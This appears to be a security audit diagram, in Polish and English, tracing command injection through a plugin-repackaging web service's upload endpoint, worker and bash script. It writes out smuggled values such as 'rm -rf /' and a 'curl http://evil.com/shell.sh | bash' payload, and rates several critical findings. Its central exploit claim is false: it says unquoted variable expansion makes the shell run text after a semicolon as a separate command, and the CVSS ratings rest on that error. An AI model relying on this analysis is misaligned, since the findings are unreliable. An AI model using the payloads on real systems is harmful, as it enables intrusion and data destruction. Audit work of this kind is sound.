╔══════════════════════════════════════════════════════════════════════════════╗
║                    ANALIZA PRZEPŁYWU DANYCH - Command Injection             ║
║                      dify-plugin-repackaging-web                             ║
╚══════════════════════════════════════════════════════════════════════════════╝

┌─────────────────────────────────────────────────────────────────────────────┐
│ ATTACK VECTOR #1: Upload Endpoint (KRYTYCZNY)                               │
└─────────────────────────────────────────────────────────────────────────────┘

[USER INPUT]
    │
    ├─► file.filename    (e.g., "plugin.difypkg; evil.sh")
    ├─► platform         (e.g., "x86_64; whoami")
    └─► suffix           (e.g., "offline; rm -rf /")
    │
    ▼
┌────────────────────────────────────┐
│  FastAPI Endpoint                   │  /api/v1/tasks/upload
│  tasks.py:334-438                   │
│                                     │  WALIDACJA:
│  - Check file extension (.difypkg)  │  ❌ Minimalna
│  - Check file size (< 100MB)        │  ❌ Brak sanityzacji filename
│  - Save to /app/temp/{task_id}/     │  ❌ Brak walidacji platform
└────────────────────────────────────┘  ❌ Brak walidacji suffix
    │
    │ Creates task record in Redis
    │ Queues Celery task
    ▼
┌────────────────────────────────────┐
│  Celery Worker                      │  process_repackaging()
│  celery_app.py:89                   │
│                                     │
│  Args:                              │
│  - task_id                          │
│  - file_path (from upload)          │  ⚠️  Zawiera niebezpieczne znaki
│  - platform                         │  🔴 NIEZWALIDOWANY
│  - suffix                           │  🔴 NIEZWALIDOWANY
└────────────────────────────────────┘
    │
    │ Calls RepackageService
    ▼
┌────────────────────────────────────┐
│  RepackageService                   │  repackage.py:13-18
│                                     │
│  Builds command:                    │
│  cmd = [script_path]                │
│  if platform:                       │
│      cmd.extend(["-p", platform])   │  🔴 INJECTION POINT #1
│  cmd.extend(["-s", suffix,          │  🔴 INJECTION POINT #2
│              "local", file_path])   │  🟠 INJECTION POINT #3
└────────────────────────────────────┘
    │
    │ asyncio.create_subprocess_exec(*cmd)
    │ ✅ BEZPIECZNE w Python (lista argumentów)
    ▼
┌────────────────────────────────────┐
│  Shell Script Execution             │  plugin_repackaging.sh
│                                     │
│  RECEIVES:                          │
│  $1 = "-p"                          │
│  $2 = platform value                │  🔴 Używany w PIP_PLATFORM
│  $3 = "-s"                          │
│  $4 = suffix value                  │  🔴 Używany w PACKAGE_SUFFIX
│  $5 = "local"                       │
│  $6 = file_path                     │  🟠 Używany w realpath
└────────────────────────────────────┘
    │
    ├─► getopts parsing (line 172-177)
    │   │
    │   ├─► p) PIP_PLATFORM="--platform ${OPTARG} --only-binary=:all:"
    │   │     └─► ❌ NIECYTOWANA ZMIENNA
    │   │
    │   └─► s) PACKAGE_SUFFIX="${OPTARG}"
    │         └─► ❌ UŻYWANA W ŚCIEŻKACH BEZ QUOTE
    │
    ├─► Line 95: PLUGIN_PACKAGE_PATH=`realpath $2`
    │             └─► 🔴 COMMAND SUBSTITUTION - INJECTION!
    │
    ├─► Line 105: unzip -o ${PACKAGE_PATH} -d ${CURR_DIR}/${PACKAGE_NAME}
    │             └─► ❌ NIECYTOWANE ZMIENNE
    │
    └─► Line 113: pip download ${PIP_PLATFORM} -r requirements.txt ...
                  └─► 🔴 SHELL EXPANSION - COMMAND EXECUTION!


┌─────────────────────────────────────────────────────────────────────────────┐
│ EXPLOITATION SCENARIO                                                        │
└─────────────────────────────────────────────────────────────────────────────┘

INPUT:
  platform = "x86_64; curl http://evil.com/shell.sh | bash #"

FLOW:
  ┌──────────────────────────────────────────────────────────────┐
  │ Python subprocess (SAFE):                                     │
  │ cmd = ["/app/scripts/plugin_repackaging.sh",                 │
  │        "-p", "x86_64; curl http://evil.com/shell.sh | bash #",
  │        "-s", "offline", "local", "/app/temp/..."]            │
  └──────────────────────────────────────────────────────────────┘
    │
    ▼
  ┌──────────────────────────────────────────────────────────────┐
  │ Shell script receives (SAFE argument passing):                │
  │ $OPTARG = "x86_64; curl http://evil.com/shell.sh | bash #"   │
  └──────────────────────────────────────────────────────────────┘
    │
    ▼
  ┌──────────────────────────────────────────────────────────────┐
  │ Variable assignment (STILL SAFE):                             │
  │ PIP_PLATFORM="--platform x86_64; curl ... | bash # --only-..." 
  └──────────────────────────────────────────────────────────────┘
    │
    ▼
  ┌──────────────────────────────────────────────────────────────┐
  │ 🔴 DANGEROUS: Unquoted variable expansion in command!        │
  │                                                               │
  │ pip download ${PIP_PLATFORM} -r requirements.txt ...         │
  │                                                               │
  │ SHELL EXPANDS TO:                                             │
  │ pip download --platform x86_64; curl ... | bash # --only-... │
  │              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^               │
  │              EXECUTED AS SEPARATE COMMANDS!                   │
  └──────────────────────────────────────────────────────────────┘
    │
    ├─► pip download --platform x86_64
    │   (executes normally)
    │
    ├─► curl http://evil.com/shell.sh | bash
    │   🔴 MALICIOUS CODE EXECUTED!
    │
    └─► # --only-binary=:all: -r requirements.txt ...
        (commented out by #)


┌─────────────────────────────────────────────────────────────────────────────┐
│ CRITICAL VULNERABILITIES SUMMARY                                             │
└─────────────────────────────────────────────────────────────────────────────┘

🔴 CRITICAL: Command Injection via platform parameter
   Location: plugin_repackaging.sh:174, 113
   Impact: RCE, Full system compromise
   CVSS: 9.8

🔴 CRITICAL: Command Injection via suffix parameter  
   Location: plugin_repackaging.sh:140, 145
   Impact: RCE, Data destruction
   CVSS: 9.8

🟠 HIGH: Path Injection via file_path parameter
   Location: plugin_repackaging.sh:95, 105
   Impact: RCE, Directory traversal
   CVSS: 8.1

🟡 MEDIUM: Environment Variable Injection
   Location: plugin_repackaging.sh:8-10, 113
   Impact: Supply chain attack
   CVSS: 6.5


┌─────────────────────────────────────────────────────────────────────────────┐
│ ROOT CAUSE ANALYSIS                                                          │
└─────────────────────────────────────────────────────────────────────────────┘

1. DEFENSE IN PYTHON ✅
   ├─ Using create_subprocess_exec() (NOT create_subprocess_shell())
   ├─ Arguments passed as list (NOT as string)
   └─ No shell=True parameter

2. VULNERABILITY IN BASH ❌
   ├─ Unquoted variable expansion in commands
   ├─ No input validation on OPTARG values
   ├─ Using backticks for command substitution
   └─ Variables interpolated directly into shell commands

3. MISSING VALIDATION LAYERS ❌
   ├─ No input sanitization in FastAPI endpoints
   ├─ No whitelist validation for platform parameter
   ├─ No regex validation for suffix parameter
   └─ No filename sanitization for uploaded files


The Python layer is SECURE, but the shell script layer is VULNERABLE!
Security is only as strong as the weakest link.

